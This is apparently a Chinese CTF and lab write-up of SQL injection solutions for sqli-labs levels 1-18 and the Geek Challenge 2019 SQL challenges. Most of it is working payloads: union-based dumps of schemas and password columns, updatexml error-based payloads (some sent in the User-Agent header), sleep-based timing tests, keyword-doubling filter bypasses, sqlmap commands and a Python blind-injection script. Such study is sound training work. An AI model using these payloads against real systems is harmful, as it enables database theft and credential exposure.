## **sqli-labs 靶场（BUU 题库）**
### Less1-Less4（联合注入）
**注：出现的类型在笔记里有详细题解，不再多写回显的判断了，以下只判断注入和闭合的类型，并粘贴最后的注入语句。**

#### Less1：
笔记写过了，不再提，只粘一下注入语句

```sql
?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctftraining'--+
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='flag'--+
?id=-1' union select 1,2,flag from ctftraining.flag--+
```

#### Less2：
转义字符判断出是数字型注入

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732028251075-4ef649da-85d1-41f8-89c1-3eaf81457340.png)

注入语句

```sql
?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctftraining'
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='flag'--+
?id=-1 union select 1,2,flag from ctftraining.flag
```

#### Less3：
判断出是单引号加括号闭合

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732028447416-82a5cdd3-e330-465d-b5cc-a0a4439fa98c.png)

注入语句

```sql
?id=-1') union select 1,2,group_concat(schema_name) from information_schema.schemata--+
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctftraining'--+
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='flag'--+
?id=-1') union select 1,2,flag from ctftraining.flag--+
```

#### **Less4：**
**判断出是双引号加括号闭合**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732028554929-b2ea661e-88e2-44c8-a161-5784f21c752a.png)

注入语句

```sql
?id=-1") union select 1,2,group_concat(schema_name) from information_schema.schemata--+
?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctftraining'--+
?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='flag'--+
?id=-1") union select 1,2,flag from ctftraining.flag--+
```

### Less5-Less8（布尔盲注）
#### Less5：
首先可以看到这个题是没有明确回显的，只知道对错，不知道内容

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732063901140-e0c0c8d3-2adb-435d-a2e2-e43983702cac.png)

首先先看一下闭合形式，是单引号![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732063992855-3fdfd596-2b52-4339-b9c4-b40c375d0a28.png)

使用布尔盲注

具体不说了，上面写过了。

#### **Less6：**
**双引号闭合，不多说了**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095113030-f80cdfab-e15b-4c32-861f-0f99dccb5a5e.png)

#### Less7：
报错信息被改了

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095376281-472ccce0-c7b4-4a4a-8782-bb0748370732.png)

##### 第一步（测试单双引号）
```sql
# 报错
?id=1'
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095415695-3f7f6daa-cf34-42e8-8148-d3a9a87f0ff2.png)

```sql
# 不报错
?id=1"
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095468890-6bda5196-8543-4265-8e51-91169ca12679.png)

##### **第二步（对单引号继续测试）**
```sql
# 报错
?id=1'--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095605318-ddaf4cbe-6938-4639-a5d7-87514a5f44a9.png)

##### 第三步（测试括号）
```sql
# 报错
?id=1')--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095690253-d180c0d6-7e67-4a13-ae67-dc17033659fe.png)

##### 第四步（继续加括号）
```sql
# 成功
?id=1'))--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095748107-f770fe02-42c3-497d-beff-6a6c6c19da48.png)

得到了闭合方式，之后的用脚本

#### Less8：
**没报错回显，按方法一**

**闭合方式是单引号**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732096045372-b3afd9b0-555a-4d73-83b9-8b6852898053.png)



### Less9-Less10（延时盲注）
**注：因为时间盲注需要借助 if 等逻辑判断，所以不能跟前两种一样，先用没有注释符的内容去判断了，要直接用加注释符和逻辑判断的语句去判断**

#### Less9：
**判断闭合**

```sql
?id=1' and if(1=1,sleep(5),1)--+
?id=1" and if(1=1,sleep(5),1)--+
```

**第一个有延时，但引号闭合**

#### **Less10：**
**判断闭合**

```sql
?id=1' and if(1=1,sleep(5),1)--+
?id=1" and if(1=1,sleep(5),1)--+
```

**第二个有延时，但双引号闭合**

### Less11-Less14（联合注入 POST 型）
#### Less11：
输入 1\，看出是单引号闭合

#### Less12：
**老方法，看出是双引号加括号闭合**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732163087650-ba716764-31f4-4979-b5fc-e4c0b65ebaf8.png)

#### Less13：
**单引号加括号闭合**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732163041484-7d38f0bb-ed88-49ff-afc6-1c6fa9ff3a15.png)

#### Less14：
**双引号闭合**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732163150873-2db4562c-9eb5-488e-86e5-db8e293a08ba.png)



### Less15-Less16（布尔盲注 POST 型）
#### Less15：
**已经没有报错信息了，但是通过测试发现，还有正确与错误的信息作比较，那这就是盲注**

```sql
# 页面正确
1' or 1=1#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732163491673-2216f3b2-aceb-4df4-806b-409797839f4b.png)

使用 sqlmap

```sql
python sqlmap.py -r post_test\less15.txt -dbs
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732167607886-73b89cfb-d53b-46fd-a269-a9ad5bddee53.png)

很奇怪的是，指定了布尔类型却没反应

```sql
python sqlmap.py -r post_test\less15.txt --technique B -dbs
```

****

#### Less16：
输入下列内容，成功。双引号加括号闭合

```sql
1") or 1=1#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732167944445-406cf7a8-5ad1-4bd3-b17e-952ee0f66a82.png)



### Less17-Less18（报错注入）
#### Less17：
**在笔记里写过了，不多说了**

#### Less18：(UA 头注入)
测试闭合一直没测试出来

用之前拿到的账号密码测试，出现回显是 UA 头，怀疑是 UA 头注入

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732259352675-12809c24-137b-424f-a58b-e734398a9bb6.png)

抓包在 UA 头后面加个单引号，报错了，看来这就是注入点

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732259499980-a0c75c80-161a-44cd-8867-999731bf6cba.png)

测试闭合，是两个双引号闭合

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732259689878-0fd57c00-91db-4ed6-a2b4-ec0b5c95b47d.png)

在 UA 头里注入

```sql
'and updatexml(1,concat(1,database()),2) and'
'and updatexml(1,concat(1,(select group_concat(schema_name) from information_schema.schemata)),2) and'
'and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema='ctftraining')),2) and'
'and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name='flag')),2) and'
'and updatexml(1,concat(1,(select group_concat(flag) from ctftraining.flag)),2) and'
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732261348530-7eccd00a-3d23-49bb-9bbf-98ec8f0f4c9d.png)





## [极客大挑战 2019]LoveSQL
有登录框

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732272145692-f338b707-5c49-42cd-928e-1984268c02f3.png)

```sql
1' or 1=1#
# 回显成功，单引号闭合
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732272403344-6bd58aea-9ee9-4d74-94e0-4c1835e3b9c3.png)

```sql
-1' union select 1,2,group_concat(database())#
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek'#
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'#
-1' union select 1,2,group_concat(password) from l0ve1ysq1#
```

结果

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732273124288-5a253b60-7f68-41ee-8dd5-e1db45c7df0a.png)





## [极客大挑战 2019]BabySQL
输入万能公式，都没反应

直接注吧，过滤了 or 和 by

```sql
1' order by 3#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275065300-453f8022-c6de-49d9-86d0-b12d7b03acf9.png)

试试联合注入 union 和 select 都被过滤了

```sql
-1' union select group_concat(table_name) from information_schema.tables#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275387806-76d7771c-5d26-4388-8cf8-eaafbab7a126.png)

试试双写绕过，可以。就是字段数不一样

```sql
-1' ununionion selselectect group_concat(database())#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275772022-cc58a8ae-648f-433d-b393-4a4a176839a8.png)

3 个字段可以

```sql
-1' ununionion selselectect 1,2,group_concat(database())#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275862952-e3110abf-2da9-42af-bd9e-843b1a17093e.png)

下一步看出from， where 被过滤了

```sql
-1' ununionion selselectect 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek'#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275979049-78f0b705-dfe4-4a29-8449-0515ccbda90e.png)

双写

```sql
-1' ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='geek'#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732276289917-022b9618-6981-454c-8afa-aeadd72509fd.png)

下一步

```sql
-1' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='b4bsql'#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732276368374-59f71a49-b46d-40a5-8994-bf5dc00371a5.png)

最后一步

```sql
-1' ununionion selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732276535343-23e61381-dcd4-421c-90ae-6ad1d5a8fe1b.png)





## [极客大挑战 2019]HardSQL 1
发现好多关键字和符号都被过滤了

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732278569110-54a6caad-aa59-441b-8adf-c2ccce234b6b.png)

尝试报错注入,and 和空格被过滤了

```sql
1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732279437112-440fb8bf-cc97-488d-a873-e1c79cbe4f75.png)

等于号被过滤了，用 like 替代

```sql
1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),0x7e),1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732280011054-7149e318-f20a-4dba-886c-9cf6543d46f8.png)

爆表

```sql
1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732280296909-662a72fb-565e-4f57-9c96-6a513a87136f.png)

爆 flag 前半段

```sql
1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732280457483-61e56ef5-5a78-4651-9783-d6d4646676c3.png)

并不完整，借助 right 函数

```sql
# right()：顾名思义就是从右边截取字符串。
# 用法：right(str, length)，即：right(被截取字符串， 截取长度)
1'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732280998389-ab412ac8-881d-41ff-952d-7d99c9e2961d.png)

## [极客大挑战 2019]FinalSQL 1
刚进来，很懵逼

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732358929013-83ad1a61-cf25-4a5a-b3c1-b53e63ad4866.png)

把 5 个选项都点了，结果如下

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732358976121-efb22354-32c6-47c4-a318-5ea7c6f9dd98.png)![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732358982212-c407fb5b-fbfc-45e3-846b-13530a311c5c.png)![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732358999709-f4c9865d-0309-4cde-99fb-06fe2af3da9c.png)![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732359009285-ed858391-beaf-483c-9230-45b55798403b.png)![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732359014336-5133df9c-b4ab-48c4-af6a-ef0e3a2d01d1.png)

懵了，看看源码。注释了一个参数为 id 的文本框，而且 5 个界面的 url 里也写了 id 参数。这应该是注入点

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732359056732-ed2dc769-e9dd-4be1-a8d5-035de2302463.png)

试试，有反应。但是不是一个表![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732359221213-b17b612a-11a0-4fd6-9a72-87b8079e71d8.png)

因为这个 id=1 和 id=0 界面不一样，以此为基础，进行布尔盲注，and 和 or ，空格被过滤了

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732360607552-38a4a9f9-ad97-45e2-b171-d0f08cf75417.png)

用异或符试试

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732360653617-f0e37762-e629-4d5e-a393-9d8fb64be42b.png)![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732360669611-700af3a7-0ec1-48b8-9ea9-3f43dd7e588d.png)

可以，接下来构造语句

原理

```sql
1^1^1=1
1^1^0=0
```

是第三个布尔盲注的语句，进行尝试，根据结果判断真假

```sql
?id=1^1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))=105)
```

粘个别人写的脚本，用了二分法，比我写的效率高多了（读代码的想法在注释和代码后面）

```plain
import requests
import time

url = "http://ab82d2b2-e78c-4cbf-a6a4-719d50adefac.node5.buuoj.cn:81/search.php?"
temp = {"id": ""}
column = ""
for i in range(1, 1000):
    time.sleep(0.06)
    low = 32
    high = 128
    mid = (low + high) // 2
    while (low < high):
        # 库名
        temp["id"] = "1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)^1" % (i, mid)
        # 表名
        # temp["id"] = "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)^1" %(i,mid)
        # 字段名
        # temp["id"] = "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)^1" %(i,mid)
        # 内容
        # temp["id"] = "1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1" %(i,mid)
        r = requests.get(url, params=temp)
        time.sleep(0.04)
        print(low, high, mid, ":")
        # 二分法
        if "Click" in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
        # 不进行长度判断，而使代码停下的关键
        # 超过长度之后，所有的页面都是error，最终mid为32，使代码停下
        # 后面的mid==127不太明白意思
    if (mid == 32 or mid == 127):
        break
    column += chr(mid)
    print(column)

print("All:", column)
```

> 读了代码，写一下思路
>
> 1.没有进行长度判断，减少步骤
>
> 2.利用二分法判断 ascii 码值,减少步骤;
>
> 3.32 到 128 正好是字符的 ascii 值范围,也提高效率
>

粘一下结果

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732361554511-1be98a24-baba-4d07-9bc7-ec5c046e24d6.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732361667569-af8f04ef-e417-43ba-b19f-ab9d9e05563f.png)![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732362702605-13c54c39-ae54-4684-9a09-ea786296e4db.png)



